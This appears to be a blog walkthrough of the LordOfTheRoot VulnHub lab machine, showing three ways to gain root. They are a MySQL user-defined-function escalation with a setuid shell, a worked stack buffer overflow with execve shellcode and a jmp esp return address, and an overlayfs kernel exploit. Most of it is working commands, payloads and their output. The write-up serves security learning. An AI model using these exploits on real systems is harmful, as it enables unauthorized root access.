I downloaded my [linux_privcheck](https://github.com/chousensha/linux_privcheck) tool with <code>wget https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py</code> and ran it on the machine while I ate a lasagna. Then I combed through the output (note to self: I have to revisit my script and make improvements to it, will get to it). The interesting tidbits that I observed were:

``` 
root      1174     1  0 08:15 ?        00:00:08 /usr/sbin/mysqld
```

MySQL running as root! Definitely on to something there, as we could get root credentials from SQLi. The other thing I found were some setuid binaries in a suspicious folder:

``` 
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
```

The machine description on VulnHub stated that there are 2 methods for gaining privilege escalation..and here we are with 2 possible venues of attack! Let's take them in order!

## Privilege escalation method #1 - via MySQL

With MySQL running as root, we can use [a UDF and a setuid binary to gain a root shell](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/). At the core of this exploit is the fact that a User Defined Function can be evaluated as SQL code to run commands in the context of the MySQL process, which is root in this case. As I was reading through the article, it became clear that root credentials would be needed for the database server. So I went back to sqlmap, and this time added the switches <code>--users</code> and <code>--passwords</code>:

``` 
database management system users [5]:
[*] 'debian-sys-maint'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'
[*] 'root'@'lordoftheroot'

database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *A55A9B9049F69BC2768C9284615361DFBD580B34
[*] root [1]:
    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
```

I used an online cracker for the root hash, and the cracked password was *darkshadow*. Then I connected to the MySQL database:

``` 
smeagol@LordOfTheRoot:~$ mysql -u root -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1829
Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```


Next, I followed the steps of the [infamoussyn article](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/), which are really well explained. UDF files need to be [locally compiled and installed on the server host](https://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html), and a special directory is required for that..

- Find the location where MySQL looks for shared object files, identified by the <code>plugin_dir</code> variable:

``` 
mysql> show variables like "plugin_dir";
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)
```

The required directory is found at <code>/usr/lib/mysql/plugin/</code>. This is where we'll put our UDF object files.

- Now it's time to compile the object file. The exploit that allows privilege escalation is called[raptor_udf2.c](https://www.exploit-db.com/exploits/1518/). I downloaded it to the compromised machine, and followed the instructions in the source code to compile it:

``` 
gcc -g -c raptor_udf2.c
```

If you are lost in the myriad of GCC options from its manpage, there is a cool page offering [options summary](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html) in a way that lets you jump to whatever interests you. Here, I compiled the C file without linking, and with debugging information. This produced an object file called <code>raptor_udf2.o</code>. 

- Next, you create a shared library and link it:

``` 
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

If you copy from the source code, you have to change the 1 in *-W1* to a lowercase l, otherwise you get an error. Here's a [good resource](http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) to help you untangle the above command. Now you should also have in your directory a shared object called <code>raptor_udf2.so</code>.

- Now you create a table inside MySQL and insert the shared object contents. Switch to the mysql DB:

``` 
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Create table:

``` 
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.03 sec)
```

Load your .so file:

``` 
mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
Query OK, 1 row affected (0.01 sec)
```

- Copy the .so file to the plugin directory:

``` 
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.05 sec)
```

- Now you can create the UDF:

``` 
mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)
```

- Confirm that it works:

``` 
mysql> select do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out');
+------------------------------------------------------------+
| do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out') |
+------------------------------------------------------------+
|                                                          0 |
+------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> \! cat /tmp/out
uid=0(root) gid=0(root) groups=0(root)
```

Note that you can use *\\!* to run commands from within the MySQL shell.

- Finally, we want to gain a real root shell. A setuid shell is ideal for this. I placed the following C code inside a file called shell.c:

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

I used MySQL to compile it:

``` 
mysql> select do_system("gcc -o /tmp/ring /home/smeagol/shell.c");
+-----------------------------------------------------+
| do_system("gcc -o /tmp/ring /home/smeagol/shell.c") |
+-----------------------------------------------------+
|                                                   0 |
+-----------------------------------------------------+
1 row in set (0.15 sec)
```

Now set the SUID bit:

``` 
mysql> select do_system("chmod u+s /tmp/ring");
+----------------------------------+
| do_system("chmod u+s /tmp/ring") |
+----------------------------------+
|                                0 |
+----------------------------------+
1 row in set (0.01 sec)
```

I looked inside /tmp for confirmation:

``` 
smeagol@LordOfTheRoot:~$ ls -l /tmp/
total 12
-rw-rw---- 1 smeagol smeagol   39 Jun 14 04:06 out
-rwsrwx--x 1 root    root    7410 Jun 14 04:16 ring
```

Lastly, I dropped to a shell with <code>\\! sh</code>, and ran the newly created binary:

``` 
$ /tmp/ring
root@LordOfTheRoot:~# cat /root/Flag.txt 
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```

Inside root's directory I also found source code for the binaries that will supply the second method of exploitation. And a Python script that moves them around, just like in the Tr0ll 2 challenge..

## Privilege escalation method #2 - Binary exploitation

So, I previously looked at the source code of the binaries inside the SECRET folder, and I know one of them is vulnerable to buffer overflow. Need to find which one:

``` 
smeagol@LordOfTheRoot:/SECRET$ ls -la *
door1:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file

door2:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 5150 Sep 22  2015 file

door3:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
```

Let's see each of them:

``` 
door1/file 
Syntax: door1/file <input string>
```

I went through them, and determined that the vulnerable binary is the one with size 5150.

``` 
./file $(python -c 'print "A" * 200')
Segmentation fault (core dumped)
```

I copied the binary to /tmp, so I could work on it without the interference of the moving script. Normally, it's GDB time, but I want to expand my tools coverage, and I noticed in other writeups the mention of PEDA, or [Python Exploit Development Assistance for GDB](https://github.com/longld/peda), which adds cool features and colorizes the display. So I figured I'd give it a try, and downloaded it to the target and installed it:

``` 
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

If you want to see what PEDA can do, run <code>peda help</code> to see all available commands:

``` 
gdb-peda$ peda help
PEDA - Python Exploit Development Assistance for GDB
For latest update, check peda project page: https://github.com/longld/peda/
List of "peda" subcommands, type the subcommand to invoke it:
aslr -- Show/set ASLR setting of GDB
asmsearch -- Search for ASM instructions in memory
assemble -- On the fly assemble and execute instructions using NASM
checksec -- Check for various security options of binary
cmpmem -- Compare content of a memory region with a file
context -- Display various information of current execution context
context_code -- Display nearby disassembly at $PC of current execution context
context_register -- Display register information of current execution context
context_stack -- Display stack of current execution context
crashdump -- Display crashdump info and save to file
deactive -- Bypass a function by ignoring its execution (eg sleep/alarm)
distance -- Calculate distance between two addresses
dumpargs -- Display arguments passed to a function when stopped at a call instruction
dumpmem -- Dump content of a memory region to raw binary file
dumprop -- Dump all ROP gadgets in specific memory range
eflags -- Display/set/clear/toggle value of eflags register
elfheader -- Get headers information from debugged ELF file
elfsymbol -- Get non-debugging symbol information from an ELF file
gennop -- Generate abitrary length NOP sled using given characters
getfile -- Get exec filename of current debugged process
getpid -- Get PID of current debugged process
goto -- Continue execution at an address
help -- Print the usage manual for PEDA commands
hexdump -- Display hex/ascii dump of data in memory
hexprint -- Display hexified of data in memory
jmpcall -- Search for JMP/CALL instructions in memory
loadmem -- Load contents of a raw binary file to memory
lookup -- Search for all addresses/references to addresses which belong to a memory range
nearpc -- Disassemble instructions nearby current PC or given address
nextcall -- Step until next 'call' instruction in specific memory range
nextjmp -- Step until next 'j*' instruction in specific memory range
nxtest -- Perform real NX test to see if it is enabled/supported by OS
patch -- Patch memory start at an address with string/hexstring/int
pattern -- Generate, search, or write a cyclic pattern to memory
pattern_arg -- Set argument list with cyclic pattern
pattern_create -- Generate a cyclic pattern
pattern_env -- Set environment variable with a cyclic pattern
pattern_offset -- Search for offset of a value in cyclic pattern
pattern_patch -- Write a cyclic pattern to memory
pattern_search -- Search a cyclic pattern in registers and memory
payload -- Generate various type of ROP payload using ret2plt
pdisass -- Format output of gdb disassemble command with colors
pltbreak -- Set breakpoint at PLT functions match name regex
procinfo -- Display various info from /proc/pid/
profile -- Simple profiling to count executed instructions in the program
pyhelp -- Wrapper for python built-in help
readelf -- Get headers information from an ELF file
refsearch -- Search for all references to a value in memory ranges
reload -- Reload PEDA sources, keep current options untouch
ropgadget -- Get common ROP gadgets of binary or library
ropsearch -- Search for ROP gadgets in memory
searchmem -- Search for a pattern in memory; support regex search
session -- Save/restore a working gdb session to file as a script
set -- Set various PEDA options and other settings
sgrep -- Search for full strings contain the given pattern
shellcode -- Generate or download common shellcodes.
show -- Show various PEDA options and other settings
skeleton -- Generate python exploit code template
skipi -- Skip execution of next count instructions
snapshot -- Save/restore process's snapshot to/from file
start -- Start debugged program and stop at most convenient entry
stepuntil -- Step until a desired instruction in specific memory range
strings -- Display printable strings in memory
substr -- Search for substrings of a given string/number in memory
telescope -- Display memory content at an address with smart dereferences
tracecall -- Trace function calls made by the program
traceinst -- Trace specific instructions executed by the program
unptrace -- Disable anti-ptrace detection
utils -- Miscelaneous utilities from utils module
vmmap -- Get virtual mapping address ranges of section(s) in debugged process
waitfor -- Try to attach to new forked process; mimic "attach -waitfor"
xinfo -- Display detail information of address/registers
xormem -- XOR a memory region with a key
xprint -- Extra support to GDB's print command
xrefs -- Search for all call/data access references to a function/variable
xuntil -- Continue execution until an address or function

Type "help" followed by subcommand for full documentation.
```

It's time to run the binary! With Peda, you can create patterns just like with the Metasploit utilities:

``` 
gdb-peda$ peda help pattern
Generate, search, or write a cyclic pattern to memory
Set "pattern" option for basic/extended pattern type
Usage:
    pattern create size [file]
    pattern offset value
    pattern search
    pattern patch address size
    pattern arg size1 [size2,offset2]
    pattern env size[,offset]
gdb-peda$ pattern create 200 test
Writing pattern of 200 chars to filename "test"
```

<img class="center" src="/images/pentest/lordoftheroot/peda.png" title="peda" alt="segfault in peda">

I wanted to show a screenshot instead of the code, so you can also see the colors that make the output much more readable. You can see that EIP has been overwritten with the value 0x57414174. I searched for it in the pattern:

``` 
gdb-peda$ pattern search 0x57414174
Registers contain pattern buffer:
EBP+0 found at offset: 167
EIP+0 found at offset: 171
Registers point to pattern buffer:
[ESP] -->


<p> offset 175 &ndash; size ~25
Pattern buffer found at:
0xbffff571 : offset    0 &ndash; size  200 ($sp + -0xaf [-44 dwords])
0xbffff7f8 : offset    0 &ndash; size  200 ($sp + 0x1d8 [118 dwords])
References to pattern buffer found at:
0xbffff550 : 0xbffff571 ($sp + -0xd0 [-52 dwords])
0xbffff560 : 0xbffff571 ($sp + -0xc0 [-48 dwords])
0xbffff564 : 0xbffff7f8 ($sp + -0xbc [-47 dwords])
0xbffff6b8 : 0xbffff7f8 ($sp + 0x98 [38 dwords])
```</p>

<p>The reported offset is 171. Verified it really quick:</p>

<p><code>
gdb-peda$ r $(python -c 'print "A" * 171 + "B" * 4 + "C" * 4')
[...]
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff640 ("CCCC")
EIP: 0x42424242 ('BBBB')
</code></p>

<p>Alright, now we need some shellcode. I decided to use Peda for all the exploitation phases, so I could showcase more of its functionality. First, I looked at the options:</p>

<p>```
gdb-peda$ peda help shellcode
Generate or download common shellcodes.
Usage:</p>

<pre><code>shellcode generate [arch/]platform type [port] [host]
shellcode search keyword (use % for any character wildcard)
shellcode display shellcodeId (shellcodeId as appears in search results)
shellcode zsc [generate customize shellcode]

For generate option:
    default port for bindport shellcode: 16706 (0x4142)
    default host/port for connect back shellcode: 127.127.127.127/16706
    supported arch: x86
</code></pre>

<p>```</p>

<p>Next I searched for some execve shellcode, and settled for the below:</p>

<p><code>
[841]   Linux/x86 - Tiny Execve sh Shellcode - 21 bytes
</code></p>

<p>Let&rsquo;s see what I got here:</p>

<p>```
gdb-peda$ shellcode display 841
Connecting to shell-storm.org&hellip;</p>

<p>/*</p>

<p> Tiny Execve sh Shellcode &ndash; C Language &ndash; Linux/x86
 Copyright &copy; 2013 Geyslan G. Bem, Hacking bits</p>

<p>   <a href="http://hackingbits.com">http://hackingbits.com</a>
   <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x67;&#x65;&#121;&#x73;&#x6c;&#97;&#x6e;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#x67;&#x65;&#x79;&#115;&#x6c;&#97;&#110;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a></p>

<p> This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.</p>

<p> This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.</p>

<p> You should have received a copy of the GNU General Public License
 along with this program.  If not, see <a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a></p>

<p>*/</p>

<p>/*</p>

<p>   tiny_execve_sh_shellcode</p>

<ul>
<li>21 bytes</li>
<li>null-free</li>
</ul>


<p>   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</p>

<p>   Testing
   # ./tiny_execve_sh_shellcode</p>

<p>*/</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>unsigned char shellcode[] = \</p>

<p>&ldquo;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f&rdquo;
&ldquo;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd&rdquo;
&ldquo;\x80&rdquo;;</p>

<p>main ()
{</p>

<pre><code>    // When contains null bytes, printf will show a wrong shellcode length.

printf("Shellcode Length:  %d\n", strlen(shellcode));

// Pollutes all registers ensuring that the shellcode runs in any circumstance.

__asm__ ("movl $0xffffffff, %eax\n\t"
     "movl %eax, %ebx\n\t"
     "movl %eax, %ecx\n\t"
     "movl %eax, %edx\n\t"
     "movl %eax, %esi\n\t"
     "movl %eax, %edi\n\t"
     "movl %eax, %ebp\n\t"

     // Calling the shellcode
     "call shellcode");
</code></pre>

<p>}
```</p>

<p>Ok, the shellcode is <code>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</code>. Next we need the address of ESP, so we know where to store our shellcode. Then we can have a full payload, where we point EIP to the contents of ESP, and the shellcode gets executed.</p>

<p>```
gdb-peda$ context stack</p>

<p>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff640 (&ldquo;CCCC&rdquo;)
0004| 0xbffff644 &mdash;> 0xbffff600 (&lsquo;A&rsquo; <repeats 60 times>, &ldquo;BBBBCCCC&rdquo;)
0008| 0xbffff648 &mdash;> 0xbffff6e0 &mdash;> 0xbffff8c1 (&ldquo;XDG_SESSION_ID=1&rdquo;)
0012| 0xbffff64c &mdash;> 0xb7feccea (&lt;call_init+26>:    add    ebx,0x12316)
0016| 0xbffff650 &mdash;> 0x2
0020| 0xbffff654 &mdash;> 0xbffff6d4 &mdash;> 0xbffff803 (&ldquo;/tmp/file&rdquo;)
0024| 0xbffff658 &mdash;> 0xbffff674 &mdash;> 0x658f7063
0028| 0xbffff65c &mdash;> 0x804974c &mdash;> 0xb7e2f990 (&lt;__libc_start_main>: push   ebp)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
```</p>

<p>So ESP is located at 0xbffff640. Or so I thought..when I ran my payload, I got another segfault and the address of ESP was different. I didn&rsquo;t expect something like ASLR to be enabled, but when I checked, it actually is:</p>

<p><code>
cat /proc/sys/kernel/randomize_va_space
2
</code></p>

<p>I checked with <em>ldd</em>:</p>

<p>```
smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb773d000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
/lib/ld-linux.so.2 (0xb773f000)
</code></pre>

<p>smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb770c000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7545000)
/lib/ld-linux.so.2 (0xb770e000)
</code></pre>

<p>```</p>

<p>After some googling, I found a <a href="https://www.exploit-db.com/exploits/39669/">trick to disable ASLR</a>. On a vulnerable 32 bit system, ASLR doesn&rsquo;t always randomize the mmap base address when the stack size is set to unlimited. I verified that it works:</p>

<p>```
smeagol@LordOfTheRoot:/tmp$ ulimit -s unlimited
smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0x40024000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0x40024000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>```</p>

<p>I tweaked the exploit again, but I still couldn&rsquo;t hit on a valid ESP address. In the end, I used Peda to help me locate a <em>jmp esp</em> address:</p>

<p><code>
gdb-peda$ jmpcall esp
Not found
gdb-peda$ jmpcall esp libc
0x4003ea85 : jmp esp
</code></p>

<p>Adjusted the exploit again, and it worked:</p>

<p><code>
gdb-peda$ r $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
process 5184 is executing new program: /bin/dash
$ whoami
[New process 5187]
process 5187 is executing new program: /usr/bin/whoami
smeagol
$ [Inferior 2 (process 5187) exited normally]
Warning: not running or target is remote
</code></p>

<p>To gain root, we need to exploit the real suid binary:</p>

<p>```
smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c &lsquo;print &ldquo;A&rdquo; * 171 + &ldquo;\x85\xea\x03\x40&rdquo; + &ldquo;\x90&rdquo; * 2000 + &ldquo;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&rdquo;&rsquo;)</p>

<h1>whoami</h1>

<p>root
```</p>

<h2>Privilege escalation method #3 &ndash; kernel exploit</h2>

<p>Lastly, we&rsquo;re back to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. It&rsquo;s just a matter of download, compile, run:</p>

<p><code>
smeagol@LordOfTheRoot:/tmp$ ./overlay
root@LordOfTheRoot:/tmp# whoami
root
</code></p>

<p>We owned Mordor! This was such an interesting challenge, learned many new things! Thanks to KookSec for this!</p>

<h4>Learn more</h4>

<ul>
<li><p><a href="https://www.exploit-db.com/papers/13030/">ASLR bypassing</a></p></li>
<li><p><a href="http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf">Linux Interactive Exploit Development with GDB and PEDA</a></p></li>
<li><p><a href="https://www.exploit-db.com/exploits/39669/">disable ASLR trick</a></p></li>
</ul>


<p>Will leave you with this:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/legolas.jpg" title="&lsquo;legolas&rsquo; &lsquo;legolas&rsquo;" ></p>
]]></content>
  </entry>
  
</feed>
